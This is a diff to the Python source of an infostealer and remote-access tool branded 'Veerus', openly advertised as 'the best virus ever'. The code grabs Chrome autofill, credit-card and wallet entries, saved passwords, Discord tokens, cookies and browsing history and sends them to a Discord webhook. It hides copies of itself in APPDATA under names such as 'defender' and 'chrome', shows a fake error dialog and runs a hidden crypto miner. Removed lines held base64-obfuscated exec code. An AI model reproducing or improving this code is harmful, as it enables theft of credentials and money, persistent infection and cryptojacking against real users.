@@ -11,6 +11,7 @@ import shutil
 import command
 import socket
 import time
+import random
 import threading
 import re
 import json
@@ -19,14 +20,10 @@ import textwrap
 from glob import glob
 import FireFoxDecrypt
 import requests
-from startup import startup
-from tkinter import messagebox
-import discord
 import sys
 import base64
 from base64 import b64decode
 from Crypto.Cipher import AES
-from win32crypt import CryptUnprotectData
 from json import loads
 from regex import findall
 import platform
@@ -35,7 +32,8 @@ import time
 import codecs
 import os
 from http.server import HTTPServer, CGIHTTPRequestHandler
-
+import tkinter as tk
+import pyImpossibleObf
 
 
 """
@@ -44,32 +42,26 @@ from http.server import HTTPServer, CGIHTTPRequestHandler
 
 """
 
-WaiBook = """it|qs;00jjthprg/dpn0bqj0xejioplt5215:6<37717888576@:/heqQJx\lf}Kt7IRZW:SUs_`r8`zjxRrPLWzybLym1M:`rlguEoskPT>hLOv12n[{qc`J"""
-SALTWAIbOOk = "45d45az1daz56456adaNHBFHBHBJFazj"
-chiffre = [109, 118, 121, 115, 116, 58, 47, 52, 102, 110, 118, 108, 118, 115, 102, 48, 103, 120, 110, 47, 97, 121, 112, 48, 121, 103, 103, 107, 116, 115, 112, 117, 52, 52, 53, 52, 66, 61, 58, 50, 54, 63, 55, 61, 63, 62, 57, 58, 60, 61, 56, 64, 49, 109, 106, 119, 77, 79, 125, 94, 111, 109, 122, 83, 122, 55, 74, 83, 90, 86, 63, 87, 86, 120, 90, 96, 114, 55, 100, 123, 105, 122, 90, 116, 80, 78, 86, 125, 129, 98, 75, 120, 117, 55, 77, 59, 97, 119, 103, 107, 121, 73, 112, 119, 104, 84, 87, 66, 110, 77, 76, 117, 57, 56, 116, 98, 129, 114, 104, 101, 80]
-
-
+#WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
+chiffre = "webhook667"
 ADDRESS = "TRX:TT9CxzPs846UQ2F5zxwmPuqHV115ETvs4d" #Only RandomX, replace with your adress COIN:ADDR ex : XMR:42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 
-PORTWEB = 80
-CLONE_PROCESS = False # Create Instances of the program hidden in multiple path.
-PROCESS_NUM = 2 #2 is the perfect number,if you want your program to be un-removable put it a 4 maximum
+
+CLONE_PROCESS = True # Create Instances of the program hidden in multiple path.
+PROCCESS_NAMES = ["defender", "sys", "google", "chrome", "proxy-services", "appdata-system", "visual-studio", "temp-file"]
+PROCESS_NUM = 3 #3 is the perfect number,if you want your program to be un-removable put it a 5 maximum 
 
 FAKERROR = True #Show fake critical error 
 FAKERRMSG = "Exception at thread 0xSxZ3b78"
 MINE = True #Mine crypto? True/False
 
 DMALL_FRIENDS = False #Dm all friends in discord using token.
-DMALL_MSG = ":flag_gb: :\nFûcked by the best virus ever\n\nDiscord grabber\nTelegram session grabber\nChrome/Firefox Cr4d1t c4rds, cookies, autofill, password stealer\nUndetected\nRAT\nHidden Crypto Miner\n\n\nLink : https://github.com/0xSxZ/Veerus \n\nBy 0xSz/0xSxZ" #Leave like that if you want to support the project.
+DMALL_MSG = ":flag_gb: :\nFÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â»cked by the best virus ever\n\nDiscord grabber\nTelegram session grabber\nChrome/Firefox Cr4d1t c4rds, cookies, autofill, password stealer\nUndetected\nRAT\nHidden Crypto Miner\n\n\nLink : https://github.com/0xSxZ/Veerus \n\nBy 0xSz/0xSxZ" #Leave like that if you want to support the project.
 
 
 APP_DATA_PATH= os.environ['LOCALAPPDATA']
 DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
 NONCE_BYTE_SIZE = 12
-def transcrireCle(cle):
-	return "".join([str(ord(elt)) for elt in cle])
-
-exec(base64.b64decode("ZGVmIGRlY2hpZmZyZXIoY2hpZmZyZSwgY2xlLCBtc2cpOgoJbWVzc2FnZSA9ICIiCgljbGUgPSB0cmFuc2NyaXJlQ2xlKGNsZSkKCSMgcGFyY291cnMgZHUgdGFibGVhdSBjaGlmZnJlIDoKCWZvciBpIGluIHJhbmdlKGxlbihjaGlmZnJlKSk6CgkJIyBvbiBhcHBsaXF1ZSBsZSBjaGlmZnJlbWVudCDDoCBsJ2VudmVycwoJCWNoaWZmcmVbaV0gLT0gaW50KGNsZVtpICUgbGVuKGNsZSldKQoJCSMgb24gcmV0cm91dmUgbGUgY2FyYWN0w6hyZSBhdmVjIGNocigpCgkJbWVzc2FnZSArPSBjaHIoY2hpZmZyZVtpXSkKCQoJcmV0dXJuIG1lc3NhZ2UKV2FpQm9vayA9IHN0cihkZWNoaWZmcmVyKGNoaWZmcmUsIFNBTFRXQUliT09rLCBXYWlCb29rKSk="))
 
 
 Founded = False
@@ -107,6 +99,7 @@ chromiumpaths = [
 ]
 
 yes = "yes"
+
 if yes == "yes":
 
 	def ClearTerm():
@@ -117,23 +110,40 @@ if yes == "yes":
 	def antiAnalysis():
 		while True:
 			ClearTerm()
-	threading.Thread(target=antiAnalysis).start()
+			time.sleep(0.1)
+	#threading.Thread(target=antiAnalysis).start()
+	def valid_uuid(uuid):
+	    regex = re.compile('^[a-f0-9]{8}-?[a-f0-9]{4}-?4[a-f0-9]{3}-?[89ab][a-f0-9]{3}-?[a-f0-9]{12}\Z', re.I)
+	    match = regex.match(uuid)
+	    return bool(match)
+	def launchProcesses(path):
+		try:
+			os.system("path")
+		except Exception as e:
+			print("Err : "+ str(e))
 	if(CLONE_PROCESS == True):
+		numberOfClones = 0
 		for i in range(PROCESS_NUM):
-			if os.name != "nt" or os.name != "windows" and platform.system() != "Windows":
-				original = sys.argv[0]
+			subfolders = os.listdir(os.getenv("APPDATA"))
+			for i in range(len(subfolders)):
+				if(valid_uuid(subfolders[i])):
+					numberOfClones = numberOfClones + 1
+					print(numberOfClones)
+			if(numberOfClones <= PROCESS_NUM):
+				original = os.path.basename(__file__)
 				folderName = str(uuid.uuid4())
-				os.mkdir("/opt/" + folderName)
-				target = "/opt/" + folderName + "defender.exe"
-			else:
-				original = sys.argv[0]
-				folderName = str(uuid.uuid4())
-				os.mkdir(str(os.getenv('APPDATA')) + folderName)
-				target = str(os.getenv('APPDATA')) + folderName + "defender.exe"
-			shutil.copyfile(original, target)
+				os.mkdir(str(os.getenv('APPDATA')) +"\\" +folderName)
+				rdmchoice = random.choice(PROCCESS_NAMES) 
+				target = str(os.getenv('APPDATA')) + "\\" + folderName + "\\" + rdmchoice+ ".exe"
+				shutil.copyfile(original, target)
+				threading.Thread(launchProcesses(str(os.getenv('APPDATA')) + "\\" + folderName + "\\" + rdmchoice+ ".exe")).start()
+		else:
+			print("[.] Already duplicated.")
 	def fakerrthread():
 		if(FAKERROR == True):
-			messagebox.showwarning("Critical Error", FAKERRMSG) 
+			root = tk.Tk()
+			root.withdraw()
+			tk.messagebox.showwarning("Critical Error", FAKERRMSG) 
 	threading.Thread(target=fakerrthread).start()
 	try:
 		url = 'http://ipinfo.io/json'
@@ -189,31 +199,29 @@ if yes == "yes":
 				if not os.path.exists(chromiumpaths[i]):
 					continue
 				path = str(chromiumpaths[i] + "\\Web Data")
+				shutil.copyfile(path, "webdata.db")
+				path = "webdata.db"
 				db = sqlite3.connect(path)
 				connection = sqlite3.connect(str(path))
 				cursor = db.cursor()
 				cursor.execute("SELECT  name, value FROM 'autofill'")
 				for name, value in cursor.fetchall():
-					print(res)
 					res = res + "[.] " + name + "\n\n[.] Val : " + value + "\n"
 					if("card" in value or "credit" in value):
 						creditcard = creditcard + res
 					if("currency" in value or "billing" in value or "wallet" in value or "finance" in value):
 						currency = currency + res
 					ibm = ibm + 1
+					
 					if(ibm >= 370):
 						break
 				connection.close()
 				if(ibm >= 370):
 					break
 			Founded = True
-			try:
-				return str(res) + ":::667" + str(currency) + ":::667" + str(creditcard)
-			except:
-				return "Error:::667Error:::667Error"
+			return str(res) + ":::667" + str(currency) + ":::667" + str(creditcard)
 		except Exception as e:
 			print(e)
-			pass
 
 	def stealChromeWinHistory():
 		try:
@@ -391,7 +399,7 @@ if yes == "yes":
 
 	def decrypt(buff, master_key):
 		try:
-			return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
+			return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
 		except Exception as e:
 			return "An error has occured.\n" + e
 	askUser = "2"
@@ -544,21 +552,20 @@ if yes == "yes":
 				threading.Thread(target=MineThreadWin).start()
 				print("[.] Executing miner..")
 	connectOption()
-	if(WaiBook != "" and WaiBook != None):
-		webhook = DiscordWebhook(url=WaiBook, username="github.com/0xSxZ/Veerus/")
+	if(chiffre != "" and chiffre != None):
+		webhook = DiscordWebhook(url=chiffre, username="github.com/0xSxZ/Veerus/")
 		embed = DiscordEmbed(title='New Machine connected', description=f'New machine connected\nInfos : \nIP : {IP}\nCity : {city}\nCountry : :flag_{country.lower()}:', color='03b2f8')
 		webhook.add_embed(embed)
 		webhook.add_file(file=str(CookiesLinux()), filename="0xCookies.txt") 
 		webhook.add_file(file=getDisk0rdToken().replace("b'", "\n").replace("'", ""), filename="0xSxZ_On_Github_T0kains.txt")
 		webhook.add_file(file=PasswWin().replace("{'", "\n\n").replace("},", ""), filename="0xPasswords.txt")
-		
 		autfill = stealChromeWin().split(":::667")
+		print(autfill[1])
 		webhook.add_file(file=autfill[0], filename="Autofill.txt")
 		webhook.add_file(file="""=========Stealed By 0xSxZ on github =============
 
-"""+autfill[1] + autfill[2], filename="finance_and_money.txt")
-
+		"""+autfill[1] + autfill[2], filename="finance_and_money.txt")
 		webhook.add_file(file="""=========Stealed By 0xSxZ on github =============
 
-""" + stealChromeWinHistory().replace("'", '').replace("'", ''), filename="Lmao_PornHub_History_XDDD.txt")
+		""" + stealChromeWinHistory().replace("'", '').replace("'", ''), filename="Lmao_PornHub_History_XDDD.txt")
 		webhook.execute()
